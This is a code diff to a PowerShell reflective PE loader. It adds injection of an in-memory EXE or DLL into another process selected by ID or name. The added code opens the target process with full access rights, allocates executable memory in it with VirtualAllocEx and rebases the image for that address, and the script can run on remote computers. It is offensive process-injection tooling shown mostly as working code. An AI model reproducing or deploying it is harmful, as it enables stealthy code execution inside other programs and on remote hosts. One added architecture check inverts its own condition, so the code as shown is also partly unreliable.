@@ -123,7 +123,15 @@ Param(
 	
 	[Parameter(Position = 3, Mandatory = $false)]
 	[String]
-	$ExeArgs
+	$ExeArgs,
+	
+	[Parameter(Position = 4, Mandatory = $false)]
+	[Int32]
+	$ProcId,
+	
+	[Parameter(Position = 5, Mandatory = $false)]
+	[String]
+	$ProcName
 )
 
 Set-StrictMode -Version 2
@@ -138,7 +146,15 @@ $RemoteScriptBlock = {
 		
 		[Parameter(Position = 1, Mandatory = $false)]
 		[String]
-		$FuncReturnType
+		$FuncReturnType,
+				
+		[Parameter(Position = 2, Mandatory = $false)]
+		[Int32]
+		$ProcId,
+		
+		[Parameter(Position = 3, Mandatory = $false)]
+		[String]
+		$ProcName
 	)
 	
 	###################################
@@ -489,6 +505,11 @@ $RemoteScriptBlock = {
 		$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
 		$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
 		
+		$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
+		$VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
+		$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
+		$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
+		
 		$memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
 		$memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
 		$memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
@@ -509,6 +530,11 @@ $RemoteScriptBlock = {
 		$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
 		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
 		
+		$GetProcAddressOrdinalAddr = Get-ProcAddress kernel32.dll GetProcAddress
+		$GetProcAddressOrdinalDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
+		$GetProcAddressOrdinal = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressOrdinalAddr, $GetProcAddressOrdinalDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressOrdinal -Value $GetProcAddressOrdinal
+		
 		$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
 		$VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
 		$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
@@ -528,6 +554,11 @@ $RemoteScriptBlock = {
 		$FreeLibraryDelegate = Get-DelegateType @([Bool]) ([IntPtr])
 		$FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
 		$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
+		
+		$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
+	    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
+	    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
 		
 		return $Win32Functions
 	}
@@ -1112,21 +1143,21 @@ $RemoteScriptBlock = {
 		[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf($Win32Types.IMAGE_BASE_RELOCATION)
 		
 		#If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
-		if (($OriginalImageBase -eq [Int64]$PEInfo.PEHandle) `
+		if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
 				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
 		{
 			return
 		}
 
 
-		elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.PEHandle)) -eq $true)
+		elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
 		{
-			$BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.PEHandle)
+			$BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
 			$AddDifference = $false
 		}
-		elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($OriginalImageBase)) -eq $true)
+		elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
 		{
-			$BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalImageBase)
+			$BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
 		}
 		
 		#Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
@@ -1253,35 +1284,8 @@ $RemoteScriptBlock = {
 					[IntPtr]$NewThunkRef = [IntPtr]::Zero
 					if([Int64]$OriginalThunkRefVal -lt 0)
 					{
-						if ($PEInfo.PE64Bit -eq $true)
-						{
-							[IntPtr]$FuncOrdinal = [Int64]$OriginalThunkRefVal -band 0x7fffffffffffffff
-						}
-						else
-						{
-							[IntPtr]$FuncOrdinal = [Int64]$OriginalThunkRefVal -band 0x7fffffff
-						}
-						
-						$DllInfo = Get-PEDetailedInfo -PEHandle $ImportDllHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
-						
-						#Get the export table, and get the function address from the DLL's export table based on the ordinal supplied
-						if ($DllInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
-						{
-							Throw "Error no exports found in DLL being loaded for PE file"
-						}
-						
-						$ExportTablePtr = Add-SignedIntAsUnsigned ($ImportDllHandle) ($DllInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
-						$ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, $Win32Types.IMAGE_EXPORT_DIRECTORY)
-						 
-						$FinalOrdinal = [Int64]$FuncOrdinal - $ExportTable.Base
-						if ($FinalOrdinal -gt 0xffff)
-						{
-							Throw "Error, getting export by ordinal but ordinal is greater than 0xffff"
-						}
-						
-						$FuncOffsetAddr = Add-SignedIntAsUnsigned ($ImportDllHandle) ($ExportTable.AddressOfFunctions + ($FinalOrdinal * [System.Runtime.InteropServices.Marshal]::SizeOf([UInt32])))
-						$FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [UInt32])
-						[IntPtr]$NewThunkRef = Add-SignedIntAsUnsigned ($ImportDllHandle) ($FuncOffset)
+						$FuncOrdinal = [Int64]$OriginalThunkRefVal -band 0xffff
+						[IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressOrdinal.Invoke($ImportDllHandle, $FuncOrdinal)
 					}
 					else
 					{
@@ -1757,13 +1761,23 @@ $RemoteScriptBlock = {
 		
 		[Parameter(Position = 1, Mandatory = $false)]
 		[String]
-		$ExeArgs
+		$ExeArgs,
+		
+		[Parameter(Position = 2, Mandatory = $false)]
+		[IntPtr]
+		$RemoteProcHandle
 		)
 		
 		#Get Win32 constants and functions
 		$Win32Constants = Get-Win32Constants
 		$Win32Functions = Get-Win32Functions
 		$Win32Types = Get-Win32Types
+		
+		$RemoteLoading = $false
+		if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
+		{
+			$RemoteLoading = $true
+		}
 		
 		#Get basic PE information
 		Write-Verbose "Getting basic PE information from the file"
@@ -1779,17 +1793,41 @@ $RemoteScriptBlock = {
 		
 		#Verify that the PE and the current process are the same bits (32bit or 64bit)
 		$Process64Bit = $true
-		if ([System.Runtime.InteropServices.Marshal]::SizeOf([IntPtr]) -ne 8)
+		if ($RemoteLoading -eq $true)
 		{
-			$Process64Bit = $false
+			$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
+			$Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
+			if ($Result -ne [IntPtr]::Zero)
+			{
+				Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit" #todo might need to change this in the future
+			}
+			
+			[Bool]$Wow64Process = $false
+			$Success = Invoke-Win32 "kernel32.dll" ([Bool]) "IsWow64Process" @([IntPtr], [Ref]) @($RemoteProcHandle, [Ref]$Wow64Process)
+			if ($Success -eq $false)
+			{
+				Throw "Call to IsWow64Process failed"
+			}
+			
+			if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([IntPtr]) -eq 4)))
+			{
+				$Process64Bit = $false
+			}
+		}
+		else
+		{
+			if ([System.Runtime.InteropServices.Marshal]::SizeOf([IntPtr]) -ne 8)
+			{
+				$Process64Bit = $false
+			}
 		}
 		if ($Process64Bit -ne $PEInfo.PE64Bit)
 		{
-			Throw "PE platform doesn't match the PowerShell process architecture (32/64bit)"
+			Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
 		}
 		
 
-		#Allocate memory and write the PE to memory. Always allocating to random memory address so I have pretend ASLR
+		#Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
 		Write-Verbose "Allocating memory for the PE and write its headers to memory"
 		
 		[IntPtr]$LoadAddr = [IntPtr]::Zero
@@ -1799,14 +1837,31 @@ $RemoteScriptBlock = {
 			[IntPtr]$LoadAddr = $OriginalImageBase
 		}
 
-		$PEHandle = [IntPtr]::Zero
-		if ($NXCompatible -eq $true)
+		$PEHandle = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
+		$EffectivePEHandle = [IntPtr]::Zero		#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
+		if ($RemoteLoading -eq $true)
 		{
-			$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
+			#Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
+			$PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
+			
+			#todo, error handling needs to delete this memory if an error happens along the way
+			$EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
+			if ($EffectivePEHandle -eq [IntPtr]::Zero)
+			{
+				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
+			}
 		}
 		else
 		{
-			$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
+			if ($NXCompatible -eq $true)
+			{
+				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
+			}
+			else
+			{
+				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
+			}
+			$EffectivePEHandle = $PEHandle
 		}
 		
 		[IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
@@ -1821,7 +1876,9 @@ $RemoteScriptBlock = {
 		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
 		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
 		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
+		$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
 		Write-Debug "StartAddress: $PEHandle    EndAddress: $PEEndAddress"
+		
 		
 		#Copy each section from the PE in to memory
 		Write-Verbose "Copy PE sections in to memory"
@@ -1957,9 +2014,58 @@ $RemoteScriptBlock = {
 
 	Function Main
 	{
+		$Win32Functions = Get-Win32Functions
+		$Win32Types = Get-Win32Types
+		$Win32Constants =  Get-Win32Constants
+		
+		$RemoteProcHandle = [IntPtr]::Zero
+	
+		#If a remote process to inject in to is specified, get a handle to it
+		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
+		{
+			Throw "Can't supply a ProcId and ProcName, choose one or the other"
+		}
+		elseif ($ProcName -ne $null -and $ProcName -ne "")
+		{
+			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
+			if ($Processes.Count -eq 0)
+			{
+				Throw "Can't find process $ProcName"
+			}
+			elseif ($Processes.Count -gt 1)
+			{
+				Throw "More than one instance of $ProcName found, please specify the process ID to inject in to"
+			}
+			else
+			{
+				$ProcId = $Processes.ID
+			}
+		}
+		
+		if (($ProcId -ne $null) -and ($ProcId -ne 0))
+		{
+			#todo, call sedebugprivilege if needed
+			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
+			if ($RemoteProcHandle -eq [IntPtr]::Zero)
+			{
+				Throw "Couldn't obtain the handle for process ID: $ProcId"
+			}
+			
+			Write-Verbose "Got the handle for the remote process to inject in to"
+		}
+		
+
 		#Load the PE reflectively
 		Write-Verbose "Calling Invoke-MemoryLoadLibrary"
-		$PEHandle = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs
+		$PEHandle = [IntPtr]::Zero
+		if ($RemoteProcHandle -eq [IntPtr]::Zero)
+		{
+			$PEHandle = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs
+		}
+		else
+		{
+			$PEHandle = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle
+		}
 		if ($PEHandle -eq [IntPtr]::Zero)
 		{
 			Throw "Unable to load PE, handle returned is NULL"
@@ -1967,8 +2073,6 @@ $RemoteScriptBlock = {
 		
 		
 		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
-		$Win32Types = Get-Win32Types
-		$Win32Constants =  Get-Win32Constants
 		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
 		if ($PEInfo.FileType -ieq "DLL")
 		{
@@ -2038,8 +2142,7 @@ Function Main
 		$DebugPreference  = "Continue"
 	}
 	
-	$ProcessID = ([System.Diagnostics.Process]::GetCurrentProcess()).id
-	Write-Debug "PowerShell ProcessID: $ProcessID"
+	Write-Debug "PowerShell ProcessID: $PID"
 	
 	[Byte[]]$PEBytes = $null
 	
@@ -2080,11 +2183,11 @@ Function Main
 
 	if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
 	{
-		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType)
+		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName)
 	}
 	else
 	{
-		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType) -ComputerName $ComputerName
+		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName) -ComputerName $ComputerName
 	}
 }
 
